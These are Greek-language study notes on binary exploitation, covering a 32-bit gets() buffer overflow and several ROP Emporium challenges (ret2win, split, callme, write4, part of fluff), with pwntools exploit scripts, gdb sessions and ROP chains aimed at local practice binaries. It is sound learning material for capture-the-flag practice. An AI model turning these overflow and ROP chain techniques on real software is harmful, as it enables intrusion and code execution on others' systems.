# Binary Exploitation Notes

## Stack

Το stack είναι μια περιοχή της μνήμης που χρησιμοποιείται από τα προγράμματα για προσωρινή αποθήκευση δεδομένων, όπως τοπικές μεταβλητές, διευθύνσεις επιστροφής από συναρτήσεις και παραμέτρους συναρτήσεων. Είναι βασικό μέρος της λειτουργίας ενός προγράμματος, ειδικά στην εκτέλεση συναρτήσεων.

## Buffer Overflow

Όταν έχω ένα challenge πάνω σε ένα binary 32 bit, στο οποίο το μέγεθος του buffer είναι **στατικό**, τύπου:

```c
char buf[64];
```

Η χρήση μιας συνάρτησης που δεν ελέγχει το μέγεθος της εισόδου, βλ. **gets()**, **strcpy()**, μπορούν να οδηγήσουν σε υπερχείλιση της στοίβας. Παράδειγμα κώδικα:

```c
#include <stdio.h>

void win(){
    puts("You won");
}

void vuln(){
    char buf[64];
    puts("Hello, try to overflow me");
    gets(buf);
}

void main(){
    vuln();
}
```

Μέσω της συνάρτησης **gets()**, η οποία δεν είναι ασφαλής βλέπε:

```bash
man gets
```

Η εισαγωγή μεγαλύτερου πλήθους χαρακτήρων από όσους χωράει ο buffer, μπορεί να οδηγήσει σε segmentation fault εώς και αλλαγή της ροής του προγράμματος. Καθώς ανοίγουμε το πρόγραμμα σε κάποιον decompiler, βλ. **gdb**, μπορούμε να βρούμε τις διευθύνσεις των συναρτήσεων, καθώς και άλλων συμβόλων:

```assembly
0x08049186  win
0x080491b1  vuln
0x080491ea  main
```

Ξέροντας τα παραπάνω, πρέπει να βρούμε το ακριβές offset στο οποίο θα μπορέσουμε να παίξουμε με τον καταχωρητή instruction pointer, ή eip, του οποίου η τιμή θα μεταβληθεί ώστε να πετύχουμε το code redirection:

``` ABAP
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

gef➤  run

Hello, try to overflow me
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
```

Βλέπουμε ότι καταφέραμε να crashάρουμε το πρόγραμμα. Αρκεί να βρούμε το offset τώρα:

```ABAP
gef➤  pattern search $eip
[+] Searching for '74616161'/'61616174' with period=4
[+] Found at offset 76 (little-endian search) likely
```

Επομένως γράφουμε ένα script σε python για να κάνουμε το exploit:

```python
from pwn import *
p = process("./vuln")
win = p32(0x08049186)
offset = 76
payload = offset * b"a" + win
p.sendline(payload)
p.interactive()
```

Η εκτέλεση του οποίου αποφέρει το τελικό αποτέλεσμα:

```bash
Hello, try to overflow me
You won
[*] Got EOF while reading in interactive
```

Αντίστοιχα σε ένα binary 64 bit θα κοιτούσα τον stack pointer και θα έβρισκα το offset, ή rsp...

## Movaps

### ret2win

Μερικές φορές το exploit μπορεί να μη λειτουργεί σωστά, ανάλογα με την αρχιτεκτονική στην οποία βρισκόμαστε. Ένα σύνηθες πρόβλημα είναι το movaps, κατά το οποίο θα πρέπει η στοίβα να είναι 16 bit aligned. Όταν δεν είναι το πρόγραμμα crashάρει και έχουμε undefined behavior. Ως παράδειγμα το ret2win από ROPEmporium. Αρχικά θα πάρουμε πληροφορίες για το binary με τις εντολές **file** και **checksec**:

```file ret2win
file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```

```bash
checksec ret2win
	Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Άρα στα χέρια μας έχουμε ένα 64 bit εκτελέσιμο χωρίς κάποιο protection που πρέπει να κάνουμε bypass. Αρχικά τρέχουμε το πρόγραμμα:

```
./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
```

Επομένως Buffer Overflow κινούμαστε όπως πριν... Βρίσκουμε το offset και γράφουμε το exploit:

```python
from pwn import *

def pwn():
    context.binary = elf = ELF("./ret2win")
    offset = 40
    win = p64(0x00000000400756)
    return b"a" * offset + win

elf = context.binary = ELF("ret2win")
p = process(elf.path)
p.sendafter(b"> ", pwn())
p.interactive()
```

Εκτελώντας το παίρνουμε ως έξοδο:

```Thank you!
Well done! Here's your flag:
[*] Got EOF while reading in interactive
Process stopped with exit code -11 (SIGSEGV) (pid 15426)
```

Χωρίς να πάρουμε το flag. Παρατηρούμε επίσης ότι έχουμε segmentation fault. Κάνουμε attach το gdb να δούμε τι παίζει αφού γίνεται το άλμα στη συνάρτηση, ώστε να ελέγξουμε την τιμη του καταχωρητή rsp, επομένως ο κώδικας σε python γίνεται:

```python
from pwn import *

def pwn():
    context.binary = elf = ELF("./ret2win")
    offset = 40
    win = p64(0x00000000400756)
    return b"a" * offset +  win

elf = context.binary = ELF("ret2win")
p = process(elf.path)
gdb.attach(p, gdbscript ='''
    break *0x400769
    c
    info registers $rsp
'''
)
p.sendafter(b"> ", pwn())
p.interactive()
```

To breakpoint στο gdb είναι ακριβώς εκεί όπου καλείται η system("/bin/cat flag.txt"); Εφόσον τρέχει το child process, το gdb μας δίνει αυτή την έξοδο:

```assembly
rsp            0x7ffc15cd3308      0x7ffc15cd3308
```

Ελέγχουμε την τιμή με χρήση της python:

```python
>>> 0x7ffdeb4c3408 % 16
8
```

Και βλέπουμε ότι το stack δεν είναι aligned. Επομένως θα χρησιμοποιήσουμε ένα **ret** **gadget** για να εξασφαλίσουμε ότι το stack θα ευθυγραμμιστεί όπως πρέπει:

```python

def pwn():
    context.binary = elf = ELF("./ret2win")
    offset = 40
    win = p64(0x00000000400756)
    ret = p64(0x0000000040053e)
    return b"a" * offset + ret + win

elf = context.binary = ELF("ret2win")
p = process(elf.path)
gdb.attach(p, gdbscript = '''
    break *0x400769
    c
    info registers $rsp
''')
p.sendafter(b"> ", pwn())
p.interactive
```

```assembly
rsp            0x7ffe8776e350      0x7ffe8776e350
```

Ελέγχουμε την τιμή με χρήση της python:

```
>>> 0x7ffe8776e350 % 16
0
```

Επομένως μπορούμε να το τρέξουμε και χωρίς το gdb:

```
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process stopped with exit code 0 (pid 16749)
```

## Return Oriented Programming

### split

Το Return Oriented Programming χρησιμοποιείται ενώνοντας μερικά μικρά κομμάτια assembly, τα λεγόμενα gadgets, ώστε το exploit μας να μπορέσει να κάνει πιο σύνθετα πράγματα. Ως παράδειγμα το split από ROPEmporium:

```ABAP
    NX:         NX enabled
```

Παρατηρούμε ότι η στοίβα είναι NON EXECUTABLE, οπότε δε μπορούμε να εισάγουμε shellcode. Θα χρησιμοποιήσουμε ROP. Κάνουμε decompile με το εργαλείο IDA και βλέπουμε μια ενδιαφέρουσα συνάρτηση:

```C
int usefulFunction()
{
  return system("/bin/ls");
}
```

Παρόλα αυτά το μόνο που μπορούμε να πετύχουμε είναι να κάνουμε list τα στοιχεία του directory. Εμείς θέλουμε ένα arbitary read, οπότε πρέπει να καλέσουμε την system με διαφορετική παράμετρο. Όπως μας δίνει το hint αναζητάμε στο binary για κάποιο string που θα μας βοηθήσει. Με τη χρήση του IDA βρίσκουμε στο .data segment:

```assembly
.data:0000000000601060 usefulString    db '/bin/cat flag.txt',0
```

Μένει να δημιουργήσουμε το ROP chain (το ret_gadget χρησιμοποιείται για stack alignment issues)

```python
from pwn import *

system = p64(0x400560)
pop_rdi_ret = p64(0x4007c3)
useful_string = p64(0x601060)
offset = 40
ret_gadget = p64(0x40053e)

payload = offset * b"a" + ret_gadget + pop_rdi_ret + useful_string + system

p = process("./split")
p.sendlineafter(b"> ", payload)
p.interactive()
```

```
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

### callme 

Αντίστοιχα στο callme του ROPEmporium πρέπει να δημιουργήσεις ένα rop chain, στο οποίο καλείς 3 συναρτήσεις με 3 παραμέτρους την καθεμία συνεχόμενα. Βρίσκεις το offset και με βάση τα gadgets που υπάρχουν στο binary δημιουργείς το chain. 

Για καλή μας τύχη βρήκαμε ένα pop rdi; ret; το οποίο θα χρησιμοποιήσουμε για να περάσουμε την πρώτη παράμετρο στις συναρτήσεις, και ένα pop rsi; pop rdx; ret; με το οποίο θα περάσουμε τις επόμενες 2 παραμέτρους, βλ. **[Calling Conventions](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame)**. 

```python
from pwn import *

elf = ELF("./callme")

call1 = p64(elf.symbols["callme_one"])
call2 = p64(elf.symbols["callme_two"])
call3 = p64(elf.symbols["callme_three"])

pop_rdi_ret = p64(0x4009a3)
pop_rsi_rdx_ret = p64(0x40093d)

ret = p64(0x4006be)

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

offset = 40

p = process("./callme")

payload = b"A" * offset
payload += pop_rdi_ret + arg1 + pop_rsi_rdx_ret + arg2 + arg3 + call1
payload += pop_rdi_ret + arg1 + pop_rsi_rdx_ret + arg2 + arg3 + call2
payload += pop_rdi_ret + arg1 + pop_rsi_rdx_ret + arg2 + arg3 + call3

p.sendline(payload)
p.interactive()
```

```
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

### write4

Σε αυτό το challenge του ROPEmporium δεν υπάρχει κάποιο string σε κάποια διεύθυνση μνήμης αποθηκευμένο. Βλέπουμε παρόλα αυτά ένα χρήσιμο gadget:

```assembly
usefulGadgets proc near
mov     [r14], r15
retn
usefulGadgets endp
```

Μπορούμε να το χρησιμοποιήσουμε για να γράψουμε σε κάποια διεύθυνση που δείχνει ο r14 το περιεχόμενο του r15. Μπορούμε να το χρησιμοποιήσουμε για να κάνουμε ένα arbitary write σε κάποιο section του binary το οποίο είναι writeable. Ας πούμε το .bss. Θα χρησιμοποιήσουμε επιπλέον τα gadgets:

```assembly
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400693 : pop rdi ; ret
```

Το πρώτο για να δώσουμε τιμές στους καταχωρητές γενικού σκοπού r14 και r15, και το δεύτερο για να καλέσουμε την συνάρτηση print_file με όρισμα τη διεύθυνση στην οποία είναι γραμμένο το όνομα του αρχείου flag.txt. Επομένως παρακάτω παρατίθεται ο solver:

```python
from pwn import *

context.log_level = "critical"
elf = ELF("./write4")


mov_r14_r15 = p64(elf.symbols["usefulGadgets"])
print_file = p64(elf.symbols["print_file"])

ret = p64(0x4004e6)
pop_r14_r15_ret = p64(0x400690)
pop_rdi_ret = p64(0x400693)

bss = p64(elf.bss())
cat_flag = b"flag.txt"

offset = 40

payload = offset * b"a" + pop_r14_r15_ret + bss + cat_flag 
payload += mov_r14_r15 + ret
payload += pop_rdi_ret + bss + print_file

p = process("./write4")

'''
For shellcode DEBUG
'''
gdb.attach(p, gdbscript='''
    break *0x400690
    c
''') 

p.sendline(payload)
p.interactive()

```

```
Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
$ 
```

### Fluff

Το fluff είναι ένα challenge του ROPemporium παρόμοιο με το write4, απλά έχουμε στη διάθεσή μας περιορισμένα και πιο obscure gadgets όπως:

```assembly
   0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:	ret    
   0x000000000040062a <+2>:	pop    rdx
   0x000000000040062b <+3>:	pop    rcx
   0x000000000040062c <+4>:	add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:	ret    
   0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:	ret    
   0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
```

Για να είμαστε σε θέση να τα χρησιμοποιήσουμε πρέπει να καταλάβουμε τι κάνουν:

#### Bextr

Η εντολή **bextr** είναι μια εντολή για bit manipulation που χρησιμοποιείται για να εξάγουμε ένα μπλοκ από bits από κάποιον παράγοντα. Είναι χρήσιμο όταν θέλουμε να ανακτήσουμε συγκεκριμένα bits από κάποιον αριθμό. 

Για να τη χρησιμοποιήσουμε πρέπει να ορίσουμε 2 πράγματα:

- Τη θέση του bit από όπου θέλουμε να ξεκινήσουμε (start)

- Το πλήθος των bit από όπου θέλουμε να εξάγουμε, ξεκινώντας από το start (len).

```assembly
bextr destination, source, start, length
```

#### Stos

Η εντολή **stos** αποθηκεύει 1,2,4 ή 8 bytes τη φορά, γεμίζοντας τη διεύθυνση που δείχνει ο rdi, (βλ. [rdi]) με την τιμή του al, ax, eax ή rax αντιστοίχως. Επιπλέον η διεύθυνση του rdi αυξάνεται κατά 1, ώστε η αποθήκευση να γίνεται σε συνεχόμενες θέσεις μνήμης. 

```assembly
stos   BYTE PTR es:[rdi],al
```

#### Xlat

Η εντολή **xlat** μετακινεί το περιεχόμενο της θέσης μνήμης στο data segment, του οποίου η διεύθυνση βρίσκεται συνήθως στο άθροισμα των **bx** και **al**. Στην προκειμένη περίπτωση δουλεύουμε με τον **rbx**, όπου:

```c
al = *(rbx + al)
```

















